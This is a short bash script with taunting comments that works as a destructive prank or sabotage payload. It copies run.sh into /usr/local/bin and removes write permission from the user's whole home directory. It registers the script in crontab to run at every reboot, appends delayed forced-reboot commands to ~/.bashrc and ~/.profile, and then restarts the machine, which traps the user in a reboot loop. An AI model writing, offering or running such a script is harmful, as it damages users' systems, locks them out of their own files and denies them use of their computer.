#!/bin/bash

# hehe~
DEST_DIR="/usr/local/bin"

# :3
cp /home/$(whoami)/run.sh $DEST_DIR/run.sh

# to ensure it works :)
chmod +x $DEST_DIR/run.sh

# oh yeah baby
chmod -R a-w /home/$(whoami)

# lol
(crontab -l 2>/dev/null; echo "@reboot (sleep 5; /bin/bash $DEST_DIR/run.sh)") | crontab -

# boom
echo "(sleep 5; shutdown -r now) &" >> ~/.bashrc
echo "(sleep 5; shutdown -r now) &" >> ~/.profile

# bye-bye sweetheart~
sleep 5
shutdown -r now
